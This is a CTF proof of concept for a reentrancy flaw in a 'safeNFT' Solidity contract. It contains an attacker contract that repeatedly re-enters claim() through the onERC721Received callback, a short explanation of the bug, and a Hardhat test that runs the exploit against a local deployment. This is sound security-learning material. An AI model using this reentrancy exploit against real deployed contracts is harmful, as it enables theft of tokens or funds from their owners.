 
//  Below is the detailed explanation and poc for the CTF of in hardhat and ether js
 
// contract AttackerContract_SafeNFT  {
//     address target;
//     uint num_of_NFT_s;
//     uint num;
//     function attack (address _target,uint _num_of_NFT_s) public payable {
//     target = _target;
//     num_of_NFT_s = _num_of_NFT_s;
//     safeNFT(target).buyNFT{value:msg.value}();
//     safeNFT(target).claim();
//     }

//     function onERC721Received(
//         address operator,
//         address from,
//         uint256 tokenId,
//         bytes calldata data
//     ) external returns (bytes4) {
//         if (num < num_of_NFT_s ) {
//             num ++;
//             safeNFT(target).claim();
//         } 
//         return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
//         }

// }

// In the claim function can claim state is set false after making the external call for safeNFt which makes an external call to msg.sender and calls the function 
// onERC721Received, we use this function call to call claim function again before the canClaim state is changed.

    import {loadFixture } from "@nomicfoundation/hardhat-network-helpers";
    import { expect } from "chai";
    import { ethers } from "hardhat";
    
    describe("safeNFT", function () {
     
      async function deploymentState() {
    
        // Contracts are deployed using the first signer/account by default
        const [owner, attacker] = await ethers.getSigners();
    
        const SafeNFT = await ethers.getContractFactory("safeNFT");
        const safeNFT = await SafeNFT.deploy("MYToken","MTK",ethers.utils.parseEther("0.01"));
    
        return { safeNFT,attacker,owner};
      }
    
      describe("Deployment", function () {
        it("attcaker should be able to claim more than 1 NFT", async function () {
          const {safeNFT,owner,attacker} = await loadFixture(deploymentState);
          
          const AttackerContract = await ethers.getContractFactory("AttackerContract_SafeNFT");
          const attackerContract = await AttackerContract.connect(attacker).deploy();
            
          const add_vip_tx = await attackerContract.attack(safeNFT.address,5,{value:ethers.utils.parseEther("0.01")});
          await add_vip_tx.wait();
          
          const balance_of = await safeNFT.connect(attacker).balanceOf(attackerContract.address);
          await expect(balance_of).to.be.greaterThan(ethers.BigNumber.from("1"));
        });
    
      })
    })
    